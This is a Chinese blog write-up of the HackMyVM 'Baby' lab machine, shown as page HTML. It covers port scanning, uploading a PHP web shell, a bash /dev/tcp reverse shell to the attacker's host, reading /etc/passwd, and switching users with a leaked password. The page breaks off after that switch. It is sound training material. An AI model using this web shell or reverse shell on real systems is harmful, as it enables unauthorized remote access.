@@ -1,0 +1,1270 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Baby 靶机来源：HackMyVM（https://hackmyvm.eu/machine/Baby） 靶机作者：maze_team 系统：Linux">
+<title>HMV Baby</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/hmv-baby/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="HMV Baby">
+<meta property='og:description' content="Baby 靶机来源：HackMyVM（https://hackmyvm.eu/machine/Baby） 靶机作者：maze_team 系统：Linux">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/hmv-baby/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-18T16:34:11&#43;08:00'/><meta property='article:modified_time' content='2026-11-18T16:34:11&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/hmv-baby/assets/image-20261118163618091.png' />
+<meta name="twitter:title" content="HMV Baby">
+<meta name="twitter:description" content="Baby 靶机来源：HackMyVM（https://hackmyvm.eu/machine/Baby） 靶机作者：maze_team 系统：Linux"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/hmv-baby/assets/image-20261118163618091.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#信息收集">信息收集</a>
+      <ol>
+        <li><a href="#端口探测">端口探测</a></li>
+      </ol>
+    </li>
+    <li><a href="#立足点">立足点</a>
+      <ol>
+        <li><a href="#任意文件上传">任意文件上传</a></li>
+      </ol>
+    </li>
+    <li><a href="#横向移动">横向移动</a>
+      <ol>
+        <li><a href="#aaa">aaa</a></li>
+        <li><a href="#bbb">bbb</a></li>
+        <li><a href="#ccc">ccc</a></li>
+      </ol>
+    </li>
+    <li><a href="#提权">提权</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hmv-baby/">
+                <img src="/p/hmv-baby/assets/image-20261118163618091_hu7291317554326992074.png"
+                        srcset="/p/hmv-baby/assets/image-20261118163618091_hu7291317554326992074.png 800w, /p/hmv-baby/assets/image-20261118163618091_hu665361859290800957.png 1600w"
+                        width="800" 
+                        height="711" 
+                        loading="lazy"
+                        alt="Featured image of post HMV Baby" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hmv/" >
+                HMV
+            </a>
+        
+            <a href="/categories/very-easy/" >
+                Very Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hmv-baby/">HMV Baby</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-18</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="baby">Baby
+</h1><p>靶机来源：HackMyVM（https://hackmyvm.eu/machine/Baby）</p>
+<p>靶机作者：maze_team</p>
+<p>系统：Linux</p>
+<p><img src="/p/hmv-baby/assets/image-20261118163618091.png"
+	width="531"
+	height="472"
+	srcset="/p/hmv-baby/assets/image-20261118163618091_hu375436270480325497.png 480w, /p/hmv-baby/assets/image-20261118163618091_hu5847522576375032722.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261118163618091"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="112"
+		data-flex-basis="270px"
+	
+></p>
+<h2 id="信息收集">信息收集
+</h2><h3 id="端口探测">端口探测
+</h3><p>使用 <code>Nmap</code> 进行端口扫描。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HMV/baby<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -T4 -p- 192.168.1.9        
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-18 07:12 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.1.9 <span class="o">(</span>192.168.1.9<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0016s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:51:2A:F8 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 7.53 seconds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HMV/baby<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -sV -sC -p22,80 192.168.1.9
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-18 07:13 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.1.9 <span class="o">(</span>192.168.1.9<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00089s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    c <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.62 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:51:2A:F8 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 7.11 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>SERVICE</th>
+<th>NOTES</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>OpenSSH 8.4p1</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>OpenSSH 8.4p1</td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="立足点">立足点
+</h2><h3 id="任意文件上传">任意文件上传
+</h3><p>访问 80 端口，是一个文件上传的服务。</p>
+<p><img src="/p/hmv-baby/assets/image-20261118151513806.png"
+	width="2512"
+	height="482"
+	srcset="/p/hmv-baby/assets/image-20261118151513806_hu6811372313898369381.png 480w, /p/hmv-baby/assets/image-20261118151513806_hu14658806498440902989.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261118151513806"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="521"
+		data-flex-basis="1250px"
+	
+></p>
+<p>随便传一个文件，显示 <code>{&quot;error&quot;:{&quot;code&quot;:403,&quot;msg&quot;:&quot;XSRF Failure&quot;}}</code></p>
+<p>分析源码，了解上传所需要的参数后再上传文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s1">&#39;http://192.168.1.9/?&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: _sfm_xsrf=abc123xyz456&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-F <span class="s2">&#34;do=upload&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-F <span class="s2">&#34;file=&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-F <span class="s2">&#34;xsrf=abc123xyz456&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-F <span class="s2">&#34;file_data=@shell.php&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>shell.php</code> 的内容是 <code>&lt;?php system($_GET['cmd']);?&gt;</code>。</p>
+<p>成功上传，并且可以进行命令执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HMV/baby<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -v http://192.168.1.9/shell.php?cmd<span class="o">=</span>id
+</span></span><span class="line"><span class="cl">*   Trying 192.168.1.9:80...
+</span></span><span class="line"><span class="cl">* Established connection to 192.168.1.9 <span class="o">(</span>192.168.1.9 port 80<span class="o">)</span> from 192.168.1.8 port <span class="m">35318</span> 
+</span></span><span class="line"><span class="cl">* using HTTP/1.x
+</span></span><span class="line"><span class="cl">&gt; GET /shell.php?cmd<span class="o">=</span>id HTTP/1.1
+</span></span><span class="line"><span class="cl">&gt; Host: 192.168.1.9
+</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/8.20.0
+</span></span><span class="line"><span class="cl">&gt; Accept: */*
+</span></span><span class="line"><span class="cl">&gt; 
+</span></span><span class="line"><span class="cl">* Request completely sent off
+</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">&lt; Date: Wed, <span class="m">18</span> Nov <span class="m">2026</span> 07:25:05 GMT
+</span></span><span class="line"><span class="cl">&lt; Server: Apache/2.4.62 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt; Content-Length: <span class="m">54</span>
+</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">&lt; 
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 192.168.1.9:80 left intact</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>监听端口，准备反弹 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">1234</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行反弹 Shell 命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HMV/baby<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -v --get http://192.168.1.9/shell.php <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>--data-urlencode <span class="s2">&#34;cmd=bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.1.8/1234 0&gt;&amp;1&#39;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功拿到 Shell。</p>
+<h2 id="横向移动">横向移动
+</h2><p>读取 <code>/etc/passwd</code> 查看机器上的用户信息。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@Baby:/var/www$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+</span></span><span class="line"><span class="cl">aaa:x:1001:1001:pa**wd -&gt; root:/home/aaa:/bin/bash
+</span></span><span class="line"><span class="cl">bbb:x:1002:1002:,,,:/home/bbb:/bin/bash
+</span></span><span class="line"><span class="cl">ccc:x:1003:1003:,,,:/home/ccc:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现除了 <code>root</code> 和当前的 <code>welcome</code> 用户外，还存在三个用户：<code>aaa/bbb/ccc</code>，而备注中暴露了 <code>aaa</code> 的密码是 <code>root</code>。</p>
+<h3 id="aaa">aaa
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@Baby:/var/www$ su - aaa 
+</span></span><span class="line"><span class="cl">su - aaa
+</span></span><span class="line"><span class="cl">Password: root
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>aaa<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>aaa<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>aaa<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
